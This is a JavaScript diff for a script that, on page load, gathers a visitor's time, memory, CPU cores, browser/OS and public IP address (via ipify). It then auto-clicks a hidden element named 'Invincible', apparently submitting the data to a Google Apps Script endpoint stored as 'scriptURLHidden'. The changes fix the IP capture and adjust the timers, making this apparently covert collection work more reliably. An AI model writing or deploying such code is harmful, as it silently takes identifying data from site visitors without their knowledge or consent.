@@ -1,4 +1,4 @@
-var crrTime, userMemory, userCores, userBroSys;
+var crrTime, userMemory, userCores, userBroSys, crrIp;
 
 function fetchData() {
     /* Device Date And Time */
@@ -62,10 +62,10 @@ function fetchData() {
     try {
         $.getJSON("https://api.ipify.org?format=json",
             function(data) {
-                document.getElementById("IP_Address").value = data.ip;
+                crrIp = data.ip;
             });
     } catch {
-        document.getElementById("IP_Address") = "Cannot Fetch";
+        document.getElementById("IP_Address").value = "Cannot Fetch";
     }
 
 
@@ -185,11 +185,12 @@ function fetchData() {
     } finally {
         setTimeout(
             function() {
+                document.getElementById("IP_Address").value = crrIp;
                 document.getElementById("Invincible").click();
-            }, 100);
+            }, 1000);
     }
 }
-setTimeout(fetchData, 4000);
+setTimeout(fetchData, 2500);
 
 const scriptURLHidden = 'https://script.google.com/macros/s/AKfycbwGU68Yc9BjFKU-spCPr5Gzs4wGr2ZTqPyF_68HUhmrHRrRfr_d/exec'
 
